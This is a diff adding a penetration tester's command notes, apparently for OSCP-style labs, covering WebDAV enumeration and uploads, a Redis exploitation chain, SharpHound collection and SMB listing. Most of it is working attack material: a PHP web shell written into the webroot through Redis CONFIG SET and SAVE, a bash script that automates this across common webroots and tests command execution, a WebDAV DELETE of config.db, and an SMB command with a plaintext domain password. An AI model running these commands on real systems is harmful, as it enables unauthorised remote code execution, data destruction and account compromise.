@@ -1,0 +1,126 @@
+# Check allowed methods and headers
+curl -i -X OPTIONS http://IP/
+
+# PROPFIND with Depth:0 to get info about a path (no recursion)
+curl -i -X PROPFIND -H 'Depth: 0' http://IP/ -u 'user:pass' --insecure
+
+# PROPFIND on likely directories
+curl -i -X PROPFIND -H 'Depth: 1' http://IP/webdav/ -u 'user:pass' --insecure
+curl -i -X PROPFIND -H 'Depth: 1' http://IP/bd/ -u 'user:pass' --insecure
+
+curl -i -X PROPFIND "http://<target>/webdav/" --insecure
+curl -i -X DELETE "http://<target>/webdav/config.db" --insecure
+
+# Install davtest if missing (manual compile sometimes required)
+# Using Python-based simple script: https://github.com/robin-thomas/davtest
+# Run davtest against host
+davtest -url http://IP/
+
+
+
+
+# Interactive: safer to inspect behavior first
+cadaver http://IP/
+# then in cadaver:
+# ls
+# propfind /
+# put test.txt
+# delete test.txt
+# mkdir testdir
+
+
+echo "probe-$(date +%s)" > probe.txt
+curl -i -T probe.txt http://IP/uploads/probe.txt
+curl -i http://IP/uploads/probe.txt
+# cleanup
+curl -X DELETE http://IP/uploads/probe.txt
+
+
+==========================================================
+
+
+
+# check Redis is alive
+redis-cli -h IP -p 6379 ping
+
+# get server info
+redis-cli -h IP -p 6379 info
+
+# show current working directory and dbfilename
+redis-cli -h IP -p 6379 CONFIG GET dir
+redis-cli -h IP -p 6379 CONFIG GET dbfilename
+
+# list keys (if any) and DB size
+redis-cli -h IP -p 6379 KEYS '*'
+redis-cli -h IP -p 6379 DBSIZE
+
+
+printf '<?php system($_GET["c"]); ?>' | redis-cli -h IP -p 6379 -x SET shell
+
+
+redis-cli -h IP -p 6379 CONFIG SET dir /var/www/html
+redis-cli -h IP -p 6379 CONFIG SET dbfilename shell.php
+
+redis-cli -h IP -p 6379 SAVE
+
+curl http://IP/shell.php?c=id
+
+
+#!/bin/bash
+HOST=IP
+PORT=6379
+PAYLOAD='<?php system($_GET["c"]); ?>'
+KEY=shell
+DBFILE=shell.php
+WEBROOTS=(/var/www/html /var/www /usr/share/nginx/html /srv/www /tmp)
+
+echo "Storing payload into key '$KEY'..."
+printf '%s' "$PAYLOAD" | redis-cli -h $HOST -p $PORT -x SET $KEY
+echo "GET $KEY ->"
+redis-cli -h $HOST -p $PORT GET $KEY | sed -n '1,2p'
+
+for d in "${WEBROOTS[@]}"; do
+  echo
+  echo "Trying webroot: $d"
+  out=$(redis-cli -h $HOST -p $PORT CONFIG SET dir "$d" 2>&1)
+  echo "CONFIG SET dir -> $out"
+  if [[ "$out" != "OK" ]]; then
+    echo "skipping SAVE for $d (dir not accepted)"
+    continue
+  fi
+  echo "CONFIG SET dbfilename -> $(redis-cli -h $HOST -p $PORT CONFIG SET dbfilename $DBFILE 2>&1)"
+  echo "Running SAVE -> $(redis-cli -h $HOST -p $PORT SAVE 2>&1)"
+  echo "HTTP check: curl -s -I http://$HOST/$DBFILE | head -n 3"
+  curl -s -I "http://$HOST/$DBFILE" | head -n 3
+  echo "HTTP exec check (attempt):"
+  curl -s "http://$HOST/$DBFILE?c=id" || echo "curl failed"
+done
+
+# Cleanup suggestion (run when done)
+# redis-cli -h $HOST -p $PORT DEL $KEY
+# redis-cli -h $HOST -p $PORT CONFIG SET dir /var/lib/redis
+# redis-cli -h $HOST -p $PORT CONFIG SET dbfilename dump.rdb
+# redis-cli -h $HOST -p $PORT SAVE
+
+
+
+
+# If you uploaded the PowerShell script version:
+powershell.exe -ExecutionPolicy Bypass -File .\SharpHound.ps1 -CollectionMethods All
+
+
+# include domain, and provide credentials inline
+smbclient -L //IP -U 'OSCP\\r.andrews%BusyOfficeWorker890' -W OSCP
+# or prompt for password but still set domain
+smbclient -L //IP -U 'OSCP\\r.andrews' -W OSCP
+
+
+
+
+
+
+
+
+
+
+
